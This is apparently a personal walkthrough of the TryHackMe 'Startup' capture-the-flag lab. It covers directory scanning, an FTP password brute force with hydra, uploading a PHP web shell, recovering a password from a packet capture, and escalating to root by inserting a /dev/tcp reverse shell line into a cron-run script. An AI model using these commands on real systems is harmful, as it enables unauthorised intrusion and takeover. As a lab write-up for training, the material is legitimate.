---
title: Walkthrough - Startup
published: true
---

Abuse traditional vulnerabilities via untraditional means.

[https://tryhackme.com/room/startup](https://tryhackme.com/room/startup)

* * *

## Welcome to Spice Hut! 

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

* * * 

3 Open Ports

21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61

* * * 

## What is the secret spicy soup recipe? 

![0xskar](/assets/startup01.png)

- ``gobuster dir -u http://10.10.52.133/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,html,php --no-error -t 100``

![0xskar](/assets/startup02.png)

- We get a username "Maya" from ``notice.txt`` try to use this with hydra to get access to ftp or ssh
- ``hydra -l maya -P /usr/share/seclists/Passwords/rockyou.txt -t 16 10.10.52.133 ftp``
- Upload pentestmonkey shell to /ftp via anonymous ftp
- upgrade shell ``python3 -c 'import pty;pty.spawn("/bin/bash")'``
- ``cat recipe.txt`` to find our first ingredient.

* * * 

## What are the contents of user.txt?

- Our hint is something that doesnt belong...
- Python3 is installed i can ``python3 -m http.server 5000`` and download ``suspicious.pcapng`` from ``/incidents/``
- ``.pcapng`` is a packet capture dump. Can probably open in wireshark.
- checking this out can see a few things such as an attacker uploading a shell.php like me and an incorrect login attempts using ``c4ntg3t3n0ughsp1c3`` as a password....we also see ``lennie``...
- we can login as lennie! and find the flag in their home directory.

![0xskar](/assets/startup03.png)

* * * 

## What are the contents of root.txt?

- our hint is scripts and apparently root is running this in their crontab, because inserting ``sh -i >& /dev/tcp/10.2.127.225/6668 0>&1`` into ``/etc/print.sh`` and setting up a listener on my kali gets a root reverse shell.
- ``cat root.txt`` for our final flag.

* * * 